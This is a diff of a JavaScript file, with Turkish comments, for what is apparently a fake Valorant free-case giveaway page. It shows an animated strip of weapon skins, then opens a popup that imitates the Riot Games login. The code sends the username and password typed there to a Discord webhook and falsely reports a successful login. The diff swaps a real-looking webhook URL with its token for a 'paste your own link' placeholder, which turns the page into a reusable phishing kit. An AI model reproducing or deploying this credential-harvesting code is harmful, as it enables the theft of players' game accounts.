@@ -1,6 +1,6 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";
+// BURAYA KENDI DISCORD LINKINI YAPIŞTIR
+const WEBHOOK_URL = "SENIN_WEBHOOK_LINKIN";
 
-// Silah Çeşitliliği Arttırıldı
 const dropItems = [
     {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
     {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
@@ -12,33 +12,33 @@ const dropItems = [
     {n: "Singularity Phantom", i: "https://static.wikia.nocookie.net/valorant/images/d/d4/Singularity_Phantom.png"}
 ];
 
-const track = document.getElementById('dropTrack');
+// Sayfa tamamen yüklendiğinde çalıştır (Hata almamak için kritik!)
+window.onload = function() {
+    const track = document.getElementById('dropTrack');
+    
+    if(track) {
+        function addRandomDrop() {
+            const item = dropItems[Math.floor(Math.random() * dropItems.length)];
+            const html = `
+                <div class="drop-item">
+                    <span>YENİ DROP</span>
+                    <img src="${item.i}">
+                    <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
+                </div>
+            `;
+            track.insertAdjacentHTML('afterbegin', html);
+            if(track.children.length > 15) {
+                track.removeChild(track.lastElementChild);
+            }
+        }
 
-// Her 2 saniyede bir yeni drop ekleyen fonksiyon
-function addRandomDrop() {
-    const item = dropItems[Math.floor(Math.random() * dropItems.length)];
-    const html = `
-        <div class="drop-item">
-            <span>YENİ DROP</span>
-            <img src="${item.i}">
-            <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
-        </div>
-    `;
-    
-    // Başa ekle
-    track.insertAdjacentHTML('afterbegin', html);
-    
-    // Şerit çok uzamasın diye eski olanları temizle (isteğe bağlı)
-    if(track.children.length > 15) {
-        track.removeChild(track.lastElementChild);
+        // İlk başta şeridi doldur
+        for(let i=0; i<10; i++) addRandomDrop();
+        
+        // Animasyonu başlat
+        setInterval(addRandomDrop, 2500);
     }
-}
-
-// İlk açılışta birkaç tane ekle
-for(let i=0; i<8; i++) addRandomDrop();
-
-// Her 2 saniyede bir yeni bir tane fırlat
-setInterval(addRandomDrop, 2000);
+};
 
 let loggedIn = false;
 
@@ -46,6 +46,11 @@ function openLogin() {
     const w = 450, h = 600;
     const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
     let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);
+
+    if(!win) {
+        alert("Lütfen popup engelleyiciyi kapatın!");
+        return;
+    }
 
     win.document.body.innerHTML = `
         <style>
@@ -57,7 +62,7 @@ function openLogin() {
         </style>
         <div class="wrap">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
-            <h2>Giriş Yap</h2>
+            <h2 style="font-size:24px; color:#333;">Oturum Aç</h2>
             <input type="text" id="u" placeholder="Kullanıcı Adı">
             <input type="password" id="p" placeholder="Şifre">
             <button id="b">OTURUM AÇ</button>
@@ -65,20 +70,26 @@ function openLogin() {
     `;
 
     win.document.getElementById('b').onclick = function() {
-        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
+        const u = win.document.getElementById('u').value;
+        const p = win.document.getElementById('p').value;
         if(u && p) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🔥 **Yeni Hesap!**\n👤: \`${u}\` \n🔑: \`${p}\`` })
+                body: JSON.stringify({ content: `🔥 **Yeni Giriş!**\n👤: \`${u}\` \n🔑: \`${p}\`` })
             });
-            loggedIn = true; win.close();
-            alert("Giriş Başarılı! Ücretsiz kasanızı açabilirsiniz.");
+            loggedIn = true;
+            win.close();
+            alert("Giriş başarılı! Şimdi kasanızı açabilirsiniz.");
         }
     };
 }
 
 function checkLogin() {
-    if(!loggedIn) { alert("Önce giriş yapmalısınız!"); openLogin(); }
-    else { alert("Kasa açılıyor... Lütfen bekleyin."); }
+    if(!loggedIn) {
+        alert("Bu işlemi yapmak için önce giriş yapmalısınız.");
+        openLogin();
+    } else {
+        alert("Kasa açılıyor... Hazırlanıyor...");
+    }
 }
